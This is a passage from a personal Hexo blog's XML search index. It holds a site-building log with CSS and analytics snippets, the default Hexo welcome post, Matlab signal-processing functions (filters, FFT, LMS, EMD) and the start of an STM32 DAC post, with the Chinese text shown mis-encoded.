<li>å°†åŸæœ‰åšæ–‡çš„ <code>h4</code> æ ‡é¢˜ç»Ÿä¸€æ”¹ä¸º <code>h3</code></li>
<li>æ·»åŠ åšæ–‡ &quot;å»ºç«™æ—¥å¿—&quot; ï¼Œç”¨ä»¥è®°å½•ç½‘ç«™å»ºè®¾è¿‡ç¨‹</li>
<li>å°†åšå®¢éƒ¨ç½²åˆ°åŸŸå <code>www.litreily.top</code></li>
<li>ä¿®æ”¹ <code>primer\layout\_partial\footer.ejs</code> ï¼Œé…ç½® <code>RSS</code> è·¯å¾„ï¼Œå°† <code>atom.xml</code> æ”¹ä¸º <code>search.xml</code>ã€‚</li>
</ul>
<h2 id="2016-12-14"><a href="#2016-12-14" class="headerlink" title="2016-12-14"></a>2016-12-14</h2><ul>
<li>ç”¨PSæ‰‹ç»˜å­—æ¯ <code>L</code> ï¼Œä¿®æ”¹ç½‘ç«™logo</li>
<li>ä¿®å¤äº†åšæ–‡ä¸­æ‰€æœ‰å¼•ç”¨ <code>&gt;</code> æ˜¾ç¤ºå¼‚å¸¸çš„é—®é¢˜</li>
<li>ä¿®å¤äº†åšæ–‡ä¸­å›¾ç‰‡é”™ä½çš„é—®é¢˜</li>
<li>ä¿®æ”¹äº† <code>footer</code> ä¸­çš„ä¸»é¢˜é“¾æ¥ï¼Œå·²ä¿®æ”¹ä¸º <a href="https://github.com/Litreily/hexo-theme-primer" target="_blank" rel="noopener">https://github.com/Litreily/hexo-theme-primer</a></li>
</ul>
<h2 id="2016-12-15"><a href="#2016-12-15" class="headerlink" title="2016-12-15"></a>2016-12-15</h2><ul>
<li>å¯¹éƒ¨åˆ†åšæ–‡é‡æ–°åˆ†ç±»ï¼Œå‡å°‘ <code>categories</code> æ•°é‡</li>
<li>å°†åˆ†ç±»é¡µé¢çš„æ ‡ç­¾æ  <code>Blog Tags</code> æ¢ä¸ºåˆ†ç±»æ  <code>Blog Categories</code>ï¼Œå¹¶ç»™æ‰€æœ‰ç±»å‹æ·»åŠ é“¾æ¥</li>
<li>å»é™¤ç•™è¨€æ¿é¡µé¢ä¸­æ ‡é¢˜ä¸‹æ–¹çš„æ—¶é—´æ˜¾ç¤º</li>
<li>åœ¨ <code>css/_partial/article.styl</code> ä¸­æ·»åŠ äº† <code>pre.descriptions</code> æ ·å¼</li>
</ul>
<pre><code class="css">pre.descriptions
    font-size: 14px !important;
    border-left: 3px solid #4996D1;
    border-radius: 0 !important;
    background-color: rgba(255,255,255,0) !important;
    margin-left: 2em;
</code></pre>
<p>ç¤ºä¾‹</p>
<hr>
<pre><code class="html">&lt;pre class=&quot;descriptions&quot;&gt;
1. step1
2. step2
3. step3
&lt;/pre&gt;
</code></pre>
<ul>
<li>é’ˆå¯¹ç‰¹å®šåšæ–‡æ·»åŠ äº†ä¸¤ä¸ªæ ‡ç­¾æ ·å¼ <code>tagBlack</code> &amp; <code>tagGrey</code></li>
</ul>
<pre><code class="css">.tagBlack a, .tagGrey a{
    text-decoration: none !important;
    transition: background-color .2s ease;
    padding: .4em .6em;
    margin: 0 3px 3px 0;
    line-height: 1;
    white-space: nowrap;
    font-size: 12px;
    border: 1px solid transparent;
    display: inline-block;
    border-radius: 4px;
}

.tagBlack a{
    color: #FFF;
    background-color: #2f3337;
    &amp;:hover{
        color: #FFF;
        background-color: #0C0D0E;
    }
}

.tagGrey a{
    color: #535a60;
    background-color: #eff0f1;
    border-color: #d6d9dc;
    &amp;:hover{
        color: #535a60;
        background-color: #D6D9DC;
    }
}
</code></pre>
<p>ç¤ºä¾‹</p>
<pre><code class="html">&lt;div class=&quot;tagBlack&quot;&gt;&lt;a href=&quot;http://www.mymmqm.com/&quot;&gt;è«æ˜æ£‹å¦™&lt;/a&gt;&lt;/div&gt;
&lt;div class=&quot;tagGrey&quot;&gt;&lt;a href=&quot;http://www.xiami.com/artist/68934&quot;&gt;æ²³å›¾&lt;/a&gt;&lt;/div&gt;
</code></pre>
<ul>
<li>åœ¨èœå•æ åŠ å…¥ <code>æ ‡ç­¾</code> é¡¹ï¼Œå¹¶åœ¨æ ‡ç­¾é¡µå†…ä¸­åŠ å…¥ <code>æ ‡ç­¾äº‘</code></li>
</ul>
<pre><code class="txt">tags.ejs: æ ‡ç­¾äº‘ç•Œé¢
tag.ejs:  å•ä¸ªæ ‡ç­¾é¡µï¼Œæ˜¾ç¤ºæŸæ ‡ç­¾å†…çš„åšå®¢åˆ—è¡¨ï¼Œå¹¶åœ¨ä¾§è¾¹æ˜¾ç¤ºå¸¦æœ‰é“¾æ¥çš„æ ‡ç­¾æ 
</code></pre>
<ul>
<li><p>ä¿®æ”¹ <code>search.js</code> ä¸ <code>search-local-js.ejs</code> ï¼Œåœ¨æœç´¢åçš„è·¯å¾„ä¸­æ·»åŠ  <code>http://</code> , pä¿®å¤æœç´¢æ¡†é“¾æ¥å‡ºé”™é—®é¢˜</p>
</li>
<li><p>åœ¨ <code>themes\primer\source</code> ä¸­æ·»åŠ æ–‡ä»¶ <code>CNAME</code>ï¼Œæ·»åŠ åŸŸå</p>
</li>
</ul>
<pre><code class="yml">www.litreily.top
</code></pre>
<h2 id="2016-12-23"><a href="#2016-12-23" class="headerlink" title="2016-12-23"></a>2016-12-23</h2><ul>
<li>ä¿®å¤RSSï¼Œå°†ä¸»é¢˜ä¸­çš„ <code>footer.ejs</code> ï¼Œå°† <code>search</code> æ”¹ä¸º <code>atom</code></li>
</ul>
<pre><code class="html">&lt;a href=&quot;/atom.xml&quot;&gt;
</code></pre>
<p>å½“ç„¶ï¼Œè®©åšå®¢æˆåŠŸç”Ÿæˆ <code>atom.xml</code> çš„å‰ææ˜¯å®‰è£…å¥½ <code>feed</code> ç”Ÿæˆæ’ä»¶</p>
<pre><code class="bash">npm install hexo-generate-feed --save
</code></pre>
<ul>
<li>å‚è€ƒ<a href="http://ibruce.info/2015/04/04/busuanzi/" target="_blank" rel="noopener">ä¸è’œå­</a>ï¼Œæ·»åŠ ç«™ç‚¹æµé‡ç»Ÿè®¡æœåŠ¡</li>
</ul>
<p>åœ¨ <code>head</code> ä¸­å¯¼å…¥æ‰€éœ€çš„ <code>js</code> æ–‡ä»¶ï¼š</p>
<pre><code class="html">&lt;script async src=&quot;//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js&quot;&gt;
&lt;/script&gt;
</code></pre>
<p>å¹¶åœ¨ <code>banner.ejs</code> æ·»åŠ ä¸¤ä¸ªæ ‡ç­¾ï¼š</p>
<pre><code class="html">&lt;span class=&quot;meta-info&quot;&gt;
    &lt;span class=&quot;octicon octicon-pulse&quot;&gt;&lt;/span&gt;
    &lt;span id=&quot;busuanzi_value_site_pv&quot; class=&quot;views&quot;&gt;&lt;/span&gt;
&lt;/span&gt;
&lt;span class=&quot;meta-info&quot;&gt;
    &lt;span class=&quot;octicon octicon-flame&quot;&gt;&lt;/span&gt;
    &lt;span id=&quot;busuanzi_value_site_uv&quot; class=&quot;views&quot;&gt;&lt;/span&gt;
&lt;/span&gt;
</code></pre>
<ul>
<li>æ·»åŠ ç™¾åº¦ç»Ÿè®¡æœåŠ¡</li>
</ul>
<p>åœ¨<a href="http://tongji.baidu.com/" target="_blank" rel="noopener">ç™¾åº¦ç»Ÿè®¡</a>ä¸­æ·»åŠ å¥½ç«™ç‚¹ï¼Œæ ¹æ®æç¤ºè·å–ç»Ÿè®¡ä»£ç </p>
<pre><code class="html">&lt;script&gt;
    var _hmt = _hmt || [];
    (function() {
    var hm = document.createElement(&quot;script&quot;);
    hm.src = &quot;https://hm.baidu.com/hm.js?d34587ee0aac7488b7dd789f9f17f366&quot;;
    var s = document.getElementsByTagName(&quot;script&quot;)[0];
    s.parentNode.insertBefore(hm, s);
    })();
&lt;/script&gt;
</code></pre>
<p>åœ¨ <code>head.ejs</code> ä¸­çš„ <code>&lt;/head&gt;</code> å‰æ·»åŠ ä»¥ä¸Šä»£ç ï¼Œå¾€åä¾¿å¯åœ¨ç™¾åº¦ç»Ÿè®¡ä¸­æŸ¥çœ‹ç«™ç‚¹çš„è¯¦ç»†ä¿¡æ¯å•¦ã€‚</p>
<h2 id="2016-12-24"><a href="#2016-12-24" class="headerlink" title="2016-12-24"></a>2016-12-24</h2><ul>
<li>ä¿®å¤RSSæ— æ³•è¢«æ­£å¸¸è·å–èµ„æºçš„é—®é¢˜</li>
</ul>
<p>ä»Šå¤©ç”¨ <code>FeedDemon</code> è·å–æœ¬ç«™ç‚¹çš„ <code>RSS</code> èµ„æºï¼Œå‘ç°èƒ½å¤Ÿå¾—åˆ°åˆ—è¡¨ï¼Œä½†ç‚¹å‡»é“¾æ¥åå‘ç°å¤šäº†ä¸€ä¸ªç«™ç‚¹æ ¹ç›®å½•çš„å‰ç¼€ï¼Œåæ¥å‘ç°æ˜¯è‡ªå·±çš„æ ¹ç›®å½•è®¾ç½®æœ‰é—®é¢˜ã€‚äºæ˜¯æˆ‘ä¿®æ”¹äº†ç«™ç‚¹é…ç½®æ–‡ä»¶<code>_config.yml</code>ï¼ŒåŠ ä¸Šå‰ç¼€<code>http://</code>å°±okäº†ã€‚</p>
<pre><code class="YAML">url: http://www.litreily.top/
root: /
</code></pre>
<p>ä½†æ˜¯ä¿®æ”¹ä»¥åå‘ç°æœç´¢åŠŸèƒ½åˆå‡ºé—®é¢˜äº†ï¼Œè¿™æ‰æ„è¯†åˆ°åŸæ¥ä¿®æ”¹ <code>search.js</code> ä¸ <code>search-local-js.ejs</code> æ‰æ˜¯å¤šæ­¤ä¸€ä¸¾ï¼ŒåŸæ¥çš„é—®é¢˜åŒæ ·å‡ºåœ¨è¿™ä¸ª<code>url</code>ï¼Œæ‰€ä»¥åªèƒ½åˆå°†è¿™ä¸¤ä¸ªæ–‡ä»¶çš„ <code>http://</code> å»æ‰äº†ã€‚</p>
<h2 id="2017-04-29"><a href="#2017-04-29" class="headerlink" title="2017-04-29"></a>2017-04-29</h2><ul>
<li>æ›´æ¢æ–°ä¸»é¢˜ <a href="https://github.com/tufu9441/maupassant-hexo" target="_blank" rel="noopener">maupassant</a>ï¼Œå¤§é“è‡³ç®€</li>
<li>è§£å†³ä»£ç é«˜äº®ä¸æ­£å¸¸é—®é¢˜</li>
<li>æ›¿æ¢æœç´¢å¼•æ“è‡³æœ¬åœ°æœç´¢</li>
</ul>
<h2 id="2017-04-30"><a href="#2017-04-30" class="headerlink" title="2017-04-30"></a>2017-04-30</h2><ul>
<li>æ›´æ–°ä¸»é¢˜æ ·å¼ï¼Œä¿®å¤éƒ¨åˆ†æ–‡ç« æ˜¾ç¤ºå¼‚å¸¸çš„é—®é¢˜</li>
<li>æ›´æ–°æ ‡ç­¾äº‘æ ·å¼</li>
</ul>
<h2 id="2017-05-01"><a href="#2017-05-01" class="headerlink" title="2017-05-01"></a>2017-05-01</h2><ul>
<li>åœ¨Abouté¡µé¢æ·»åŠ è”ç³»æ–¹å¼å’Œä¸€å¥ç®€çŸ­çš„ä»‹ç»</li>
<li>åœ¨èœå•ä¸­æ·»åŠ äº†gitbookç¬”è®°çš„æ¥å£</li>
</ul>
<h2 id="å‚è€ƒèµ„æ–™"><a href="#å‚è€ƒèµ„æ–™" class="headerlink" title="å‚è€ƒèµ„æ–™"></a>å‚è€ƒèµ„æ–™</h2><h3 id="åŸŸå"><a href="#åŸŸå" class="headerlink" title="åŸŸå"></a>åŸŸå</h3><ul>
<li>å›½é™…åŸŸåç½‘ï¼š<a href="http://www.yuming.top/" target="_blank" rel="noopener">http://www.yuming.top/</a></li>
</ul>
<h3 id="hexo"><a href="#hexo" class="headerlink" title="hexo"></a>hexo</h3><ul>
<li><code>hexo</code>å¸®åŠ©æ–‡æ¡£ï¼š<a href="https://hexo.io/zh-cn/docs/" target="_blank" rel="noopener">https://hexo.io/zh-cn/docs/</a></li>
<li><code>primer</code>ä¸»é¢˜ï¼š<a href="https://github.com/yumemor/hexo-theme-primer" target="_blank" rel="noopener">https://github.com/yumemor/hexo-theme-primer</a></li>
<li><code>hexo</code>æ­å»º<code>Github-Pages</code>åšå®¢å¡«å‘æ•™ç¨‹ï¼š<a href="http://www.jianshu.com/p/35e197cb1273" target="_blank" rel="noopener">http://www.jianshu.com/p/35e197cb1273</a></li>
</ul>
<h3 id="å…¶å®ƒ"><a href="#å…¶å®ƒ" class="headerlink" title="å…¶å®ƒ"></a>å…¶å®ƒ</h3><ul>
<li><strong>ä¸è’œå­</strong>ç«™ç‚¹ç»Ÿè®¡ï¼š<a href="http://ibruce.info/2015/04/04/busuanzi/" target="_blank" rel="noopener">http://ibruce.info/2015/04/04/busuanzi/</a></li>
</ul>
]]></content>
      
        <categories>
            
            <category> æ‚ç‰©æŸœ </category>
            
        </categories>
        
        
        <tags>
            
            <tag> jekyll </tag>
            
            <tag> hexo </tag>
            
            <tag> log </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Welcome to hexo]]></title>
      <url>https://www.litreily.top/2016/12/10/hello-hexo/</url>
      <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p>
<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post-named-new-post"><a href="#Create-a-new-post-named-new-post" class="headerlink" title="Create a new post named new post"></a>Create a new post named new post</h3><pre><code class="bash">hexo new &quot;My New Post&quot;
</code></pre>
<p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p>
<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><pre><code class="bash">hexo server
</code></pre>
<p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p>
<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><pre><code class="bash">hexo generate
</code></pre>
<p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p>
<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><pre><code class="bash">hexo deploy
</code></pre>
<p>More info: <a href="https://hexo.io/docs/deployment.html" target="_blank" rel="noopener">Deployment</a></p>
]]></content>
      
        <categories>
            
            <category> Web </category>
            
        </categories>
        
        
        <tags>
            
            <tag> hexo </tag>
            
            <tag> test </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Matlab - å¸¸ç”¨å‡½æ•°é›†é”¦]]></title>
      <url>https://www.litreily.top/2016/12/09/matlab-Funcs/</url>
      <content type="html"><![CDATA[<p>åœ¨ä½¿ç”¨matlabè¿›è¡Œä¿¡å·å¤„ç†å’Œå›¾å½¢ç»˜åˆ¶è¿‡ç¨‹ä¸­ï¼ŒæŸäº›å‡½æ•°è¢«é¢‘ç¹è°ƒç”¨ï¼Œæ‰€ä»¥æœ‰å¿…è¦å°†è¿™äº›å¸¸ç”¨å‡½æ•°è¿›è¡Œæ€»ç»“å½’ç±»ã€‚</p>
<h2 id="æ»¤æ³¢å‡½æ•°"><a href="#æ»¤æ³¢å‡½æ•°" class="headerlink" title="æ»¤æ³¢å‡½æ•°"></a>æ»¤æ³¢å‡½æ•°</h2><h3 id="ä½é€šæ»¤æ³¢"><a href="#ä½é€šæ»¤æ³¢" class="headerlink" title="ä½é€šæ»¤æ³¢"></a>ä½é€šæ»¤æ³¢</h3><pre><code class="matlab">function [filtered_signal,filtb,filta]=lopass_butterworth(inputsignal,cutoff_freq,Fs,order)
% Low-pass Butterworth filter
% [filtered_signal,filtb,filta] = lopass_butterworth(inputsignal,cutoff_freq,Fs,order)
%
% This is simply a set of built-in Matlab functions, repackaged for ease of
% use by Chad Greene, October 2012.
%
% INPUTS:
% inputsignal = input time series
% cutoff_freq = filter corner frequency
% Fs = data sampling frequency
% order = order of Butterworth filter
%  
% OUTPUTS:
% filtered_signal = the filtered time series
% filtb, filta = filter numerator and denominator (optional)
%
% EXAMPLE 1:
% load train
% t = (1:length(y))/Fs;
% y_filt = lopass_butterworth(y,900,Fs,4); % cut off at 900 Hz
% figure
% plot(t,y,&#39;b&#39;,t,y_filt,&#39;r&#39;)
% xlabel(&#39;time in seconds&#39;)
% box off
% legend(&#39;unfiltered&#39;,&#39;filtered&#39;)
% sound(y,Fs)      % play original time series
% pause(2)         % pause two seconds
% sound(y_filt,Fs) % play filtered time series

nyquist_freq = Fs/2;  % Nyquist frequency
Wn=cutoff_freq/nyquist_freq;    % non-dimensional frequency
[filtb,filta]=butter(order,Wn,&#39;low&#39;); % construct the filter
filtered_signal=filtfilt(filtb,filta,inputsignal); % filter the data with zero phase
</code></pre>
<h3 id="é«˜é€šæ»¤æ³¢"><a href="#é«˜é€šæ»¤æ³¢" class="headerlink" title="é«˜é€šæ»¤æ³¢"></a>é«˜é€šæ»¤æ³¢</h3><pre><code class="matlab">function [filtered_signal,filtb,filta]=hipass_butterworth(inputsignal,cutoff_freq,Fs,order)
% High-pass Butterworth filter
% [filtered_signal,filtb,filta] = hipass_butterworth(inputsignal,cutoff_freq,Fs,order)
%
% This is simply a set of built-in Matlab functions, repackaged for ease of
% use by Chad Greene, October 2012.
%
% INPUTS:
% inputsignal = input time series
% cutoff_freq = filter corner frequency
% Fs = data sampling frequency
% order = order of Butterworth filter
%
% OUTPUTS:
% filtered_signal = the filtered time series
% filtb, filta = filter numerator and denominator (optional)
%
% EXAMPLE 1:
% load train
% t = (1:length(y))/Fs;
% y_filt = hipass_butterworth(y,900,Fs,4); % cut off at 900 Hz
% figure
% plot(t,y,&#39;b&#39;,t,y_filt,&#39;r&#39;)
% xlabel(&#39;time in seconds&#39;)
% box off
% legend(&#39;unfiltered&#39;,&#39;filtered&#39;)
% sound(y,Fs)      % play original time series
% pause(2)         % pause two seconds
% sound(y_filt,Fs) % play filtered time series

nyquist_freq = Fs/2;  % Nyquist frequency
Wn=cutoff_freq/nyquist_freq;    % non-dimensional frequency
[filtb,filta]=butter(order,Wn,&#39;high&#39;); % construct the filter
filtered_signal=filtfilt(filtb,filta,inputsignal); % filter the data with zero phase
</code></pre>
<h3 id="å¸¦é€šæ»¤æ³¢"><a href="#å¸¦é€šæ»¤æ³¢" class="headerlink" title="å¸¦é€šæ»¤æ³¢"></a>å¸¦é€šæ»¤æ³¢</h3><pre><code class="matlab">function [filtered_signal,filtb,filta]=bandpass_butterworth(inputsignal,cutoff_freqs,Fs,order)
% Bandpass Butterworth filter
% [filtered_signal,filtb,filta] = bandpass_butterworth(inputsignal,cutoff_freq,Fs,order)
%
% This is simply a set of built-in Matlab functions, repackaged for ease of
% use by Chad Greene, October 2012.
%
% INPUTS:
% inputsignal = input time series
% cutoff_freqs = filter corner frequencies in the form [f1 f2]
% Fs = data sampling frequency
% order = order of Butterworth filter
%
% OUTPUTS:
% filtered_signal = the filtered time series
% filtb, filta = filter numerator and denominator (optional)
%
% EXAMPLE 1:
% load train
% t = (1:length(y))/Fs;
% y_filt = bandpass_butterworth(y,[800 1000],Fs,4); % cut off below 800 Hz and above 1000 Hz
%
% figure
% plot(t,y,&#39;b&#39;,t,y_filt,&#39;r&#39;)
% xlabel(&#39;time in seconds&#39;)
% box off
% legend(&#39;unfiltered&#39;,&#39;filtered&#39;)
% sound(y,Fs)      % play original time series
% pause(2)         % pause two seconds
% sound(y_filt,Fs) % play filtered time series

nyquist_freq = Fs/2;  % Nyquist frequency
Wn=cutoff_freqs/nyquist_freq;    % non-dimensional frequency
[filtb,filta]=butter(order,Wn,&#39;bandpass&#39;); % construct the filter
filtered_signal=filtfilt(filtb,filta,inputsignal); % filter the data with zero phase
</code></pre>
<h3 id="å¸¦é˜»æ»¤æ³¢"><a href="#å¸¦é˜»æ»¤æ³¢" class="headerlink" title="å¸¦é˜»æ»¤æ³¢"></a>å¸¦é˜»æ»¤æ³¢</h3><pre><code class="matlab">function [filtered_signal,filtb,filta]=bandstop_butterworth(inputsignal,cutoff_freqs,Fs,order)
% Band-stop Butterworth filter
% [filtered_signal,filtb,filta] = bandstop_butterworth(inputsignal,cutoff_freqs,Fs,order)
%
% This is simply a set of built-in Matlab functions, repackaged for ease of
% use by Chad Greene, October 2012.
%
% INPUTS:
% inputsignal = input time series
% cutoff_freqs = filter corner frequencies in the form [f1 f2]
% Fs = data sampling frequency
% order = order of Butterworth filter
%
% OUTPUTS:
% filtered_signal = the filtered time series
% filtb, filta = filter numerator and denominator (optional)
%
% EXAMPLE 1:
% load train
% t = (1:length(y))/Fs;
% y_filt = bandstop_butterworth(y,[800 1000],Fs,4); % cut off below 800 Hz and above 1000 Hz
%
% figure
% plot(t,y,&#39;b&#39;,t,y_filt,&#39;r&#39;)
% xlabel(&#39;time in seconds&#39;)
% box off
% legend(&#39;unfiltered&#39;,&#39;filtered&#39;)
% sound(y,Fs)      % play original time series
% pause(2)         % pause two seconds
% sound(y_filt,Fs) % play filtered time series

nyquist_freq = Fs/2;  % Nyquist frequency
Wn=cutoff_freqs/nyquist_freq;    % non-dimensional frequency
[filtb,filta]=butter(order,Wn,&#39;stop&#39;); % construct the filter
filtered_signal=filtfilt(filtb,filta,inputsignal); % filter the data with zero phase
</code></pre>
<h2 id="ç»˜å›¾å‡½æ•°"><a href="#ç»˜å›¾å‡½æ•°" class="headerlink" title="ç»˜å›¾å‡½æ•°"></a>ç»˜å›¾å‡½æ•°</h2><pre><code class="matlab">function [  ] = setPlot( varargin )
% setPlot()
% setPlot(title)
% setPlot(title,xlabel)
% setPlot(title,xlable,ylabel)
% setPlot(title,xlabel,ylabel,xlim)
% setPlot(title,xlable,ylabel,xlim,ylim)

narginchk(0,5);     % åˆ¤æ–­è¾“å…¥å‚æ•°æ˜¯å¦è¶³å¤Ÿ

grid on;
axis tight;

if nargin&gt;=1
    title(varargin{1});
end

if nargin&gt;=2
    xlabel(varargin{2});
end

if nargin&gt;=3
    ylabel(varargin{3});
end

if nargin&gt;=4
    xlim(varargin{4});
end

if nargin&gt;=5
    ylim(varargin{5});
end

end
</code></pre>
<h2 id="ä¿¡å·å¤„ç†å‡½æ•°"><a href="#ä¿¡å·å¤„ç†å‡½æ•°" class="headerlink" title="ä¿¡å·å¤„ç†å‡½æ•°"></a>ä¿¡å·å¤„ç†å‡½æ•°</h2><h3 id="é¢‘è°±åˆ†æ"><a href="#é¢‘è°±åˆ†æ" class="headerlink" title="é¢‘è°±åˆ†æ"></a>é¢‘è°±åˆ†æ</h3><pre><code class="matlab">function [freq,amp]=fft_signal(signal,fs,N)
% Spectrum analysis
% INPUTS:
% signal = input time series
% fs = data sampling frequency
% N = data length of signal
%
% OUTPUTS:
% freq = frequency of Spectrum
% amp = amplitude of Spectrum
%
% EXAMPLE 1:
% fs = 100;
% N = fs*10;
% t = (0:N-1)/fs;
% y = sin(2*pi*10*t);
% [freq,amp] = fft_signal(y,fs,N);
% plot(freq,amp);

amp = 2*abs(fft(signal))/N;        % æ±‚å–ä¿¡å·çš„å¹…åº¦è°±
amp = amp(1:fix(length(amp)/2));       % æˆªå–æœ‰æ•ˆéƒ¨åˆ†
freq=(0:length(amp)-1)*fs/N;       % æ¨ªåæ ‡ä»£è¡¨é¢‘ç‡
end
</code></pre>
<h3 id="å¹…å€¼åˆ†å¸ƒ"><a href="#å¹…å€¼åˆ†å¸ƒ" class="headerlink" title="å¹…å€¼åˆ†å¸ƒ"></a>å¹…å€¼åˆ†å¸ƒ</h3><pre><code class="matlab">function [ amp,dist ] = ampDist( signal,sectionNum )
% Calculate the amplitude distribution of the signal
% INPUTS:
% signal : The signal to be analyzed
% sectionNum : Number of segments
%
% OUTPUTS:
% amp : Amplitude after segmentation
% dist :Amplitude distribution
%
% EXAMPLE 1:
% fs = 1000;
% N = fs*100;
% y = wgn(1,N,10);     % é«˜æ–¯ç™½å™ªå£°
% [amp,dist] = ampDist(y,500);
% bar(amp,dist);

yMin = min(signal);
yMax = max(signal);

amp = linspace(yMin,yMax,sectionNum);
dist = hist(signal,amp);
dist = dist./length(signal);
end
</code></pre>
<h3 id="LMSæœ€å°å‡æ–¹ç®—æ³•"><a href="#LMSæœ€å°å‡æ–¹ç®—æ³•" class="headerlink" title="LMSæœ€å°å‡æ–¹ç®—æ³•"></a>LMSæœ€å°å‡æ–¹ç®—æ³•</h3><pre><code class="matlab">function [ y_error, y_filter ] = LMS( x_input,x_dest,M,u )
% LMS æœ€å°å‡æ–¹ç®—æ³•
% INPUTSï¼š
% x_input    åŸå§‹ä¿¡å·
% x_dest     æœŸæœ›ä¿¡å·
% M          é˜¶æ¬¡
% u          æ­¥é•¿å› å­
%
% OUTPUTSï¼š
% y_error    è¯¯å·®ä¿¡å·
% y_filter   æ»¤æ³¢å™¨ä¿¡å·è¾“å‡º
%
% EXAMPLE 1:
% load train
% t = (1:length(y))/Fs;
% M = 2; u = 0.5;
% y_dest = (max(y)-min(y))/2*cos(2*pi*18*t);      % å‚è€ƒä¿¡å·
% [y_error,y_filter] = LMS(y,y_dest,M,u);
% plot(t,y_error,t,y_filter);

N = length(x_input);
y_filter = zeros(1,N);
y_error  = zeros(1,N);
h = zeros(1,M);

for k=M:N
    h_old = h;
    y_filter(k) = x_dest(k:-1:k-M+1)*h_old&#39;;
    y_error(k)  = x_input(k) - y_filter(k);
    h = h_old + 2*u*y_error(k)*x_dest(k:-1:k-M+1);
end

end
</code></pre>
<h3 id="EMDç»éªŒæ¨¡æ€åˆ†è§£"><a href="#EMDç»éªŒæ¨¡æ€åˆ†è§£" class="headerlink" title="EMDç»éªŒæ¨¡æ€åˆ†è§£"></a>EMDç»éªŒæ¨¡æ€åˆ†è§£</h3><pre><code class="matlab">function imf = emd(x)
% Empiricial Mode Decomposition (Hilbert-Huang Transform)
% imf = emd(x)
% Funcs : ismonotonic, isimf, getspline, findpeaks

x   = transpose(x(:));      % å°†xå˜ä¸ºä¸€ç»´å‘é‡
imf = [];
while ~ismonotonic(x)
   x1 = x;
   sd = Inf;
   cnt=0;
   while (sd &gt; 0.1) || ~isimf(x1)
      s1 = getspline(x1);
      s2 = -getspline(-x1);
      x2 = x1-(s1+s2)/2;

      sd = sum((x1-x2).^2)/sum(x1.^2);
      x1 = x2;
      cnt=cnt+1;
   end
%    cnt

   imf{end+1} = x1;
   x          = x-x1;
end
imf{end+1} = x;

% FUNCTIONS
% åˆ¤æ–­ä¿¡å·çš„å•è°ƒæ€§
function u = ismonotonic(x)

u1 = length(findpeaks(x))*length(findpeaks(-x));
if u1 &gt; 0
    u = 0;
else
    u = 1;
end

% åˆ¤æ–­ä¿¡å·æ˜¯å¦æ»¡è¶³IMFæ¡ä»¶
% æ¡ä»¶ï¼šæå¤§å€¼ç‚¹æ•°å’Œæå°å€¼ç‚¹æ•°ä¹‹å’Œä¸è¿‡é›¶ç‚¹æ•°ç›¸ç­‰æˆ–ç›¸å·®1ï¼Ÿ
function u = isimf(x)

N  = length(x);
u1 = sum(x(1:N-1).*x(2:N) &lt; 0);
u2 = length(findpeaks(x))+length(findpeaks(-x));
if abs(u1-u2) &gt; 1
    u = 0;
else
    u = 1;
end

% ä½¿ç”¨ä¸‰æ¬¡æ ·æ¡å‡½æ•°ï¼Œå¾—åˆ°åŒ…ç»œçº¿
function s = getspline(x)

N = length(x);
p = findpeaks(x);
s = spline([0 p N+1],[0 x(p) 0],1:N);

% å¯»æ‰¾æå¤§å€¼ç‚¹
function n = findpeaks(x)
% Find peaks.
% n = findpeaks(x)

n    = find(diff(diff(x) &gt; 0) &lt; 0);
u    = find(x(n+1) &gt; x(n));
n(u) = n(u)+1;
</code></pre>
]]></content>
      
        <categories>
            
            <category> Matlab </category>
            
        </categories>
        
        
        <tags>
            
            <tag> matlab </tag>
            
            <tag> signal </tag>
            
            <tag> algorithm </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[stm32 - DACåŸºæœ¬è¾“å‡ºæ–¹å¼]]></title>
      <url>https://www.litreily.top/2016/12/05/stm32-dac/</url>
      <content type="html"><![CDATA[<h2 id="DACç®€ä»‹"><a href="#DACç®€ä»‹" class="headerlink" title="DACç®€ä»‹"></a>DACç®€ä»‹</h2><p>æ•°æ¨¡è½¬æ¢å™¨(DAC)æ˜¯æä¸ºå¸¸ç”¨çš„ç”µå­å™¨ä»¶ï¼Œå¯ä»¥å°†æ•°å­—é‡è½¬æ¢ä¸ºä»¥å‚è€ƒé‡ä¸ºåŸºå‡†çš„æ¨¡æ‹Ÿé‡ï¼Œä»¥æ»¡è¶³åº”ç”¨éœ€æ±‚ã€‚</p>
<h3 id="ç”µå‹è¾“å‡ºæ¨¡å¼"><a href="#ç”µå‹è¾“å‡ºæ¨¡å¼" class="headerlink" title="ç”µå‹è¾“å‡ºæ¨¡å¼"></a>ç”µå‹è¾“å‡ºæ¨¡å¼</h3><p>åœ¨<code>stm32</code>ä¸­ï¼Œ<code>D/A</code>è½¬æ¢å™¨åŒ…å«ä»¥ä¸‹ä¸‰ç§è¾“å‡ºæ–¹å¼ï¼š</p>
<ol>
<li>è¾“å‡ºç”µå‹</li>
<li>å™ªå£°ç”Ÿæˆ</li>
<li>ä¸‰è§’æ³¢ç”Ÿæˆ</li>
</ol>
<p>æœ¬æ–‡å°†ç€é‡ä»‹ç»æœ€åŸºæœ¬çš„ç”µå‹è¾“å‡ºæ–¹å¼ã€‚</p>
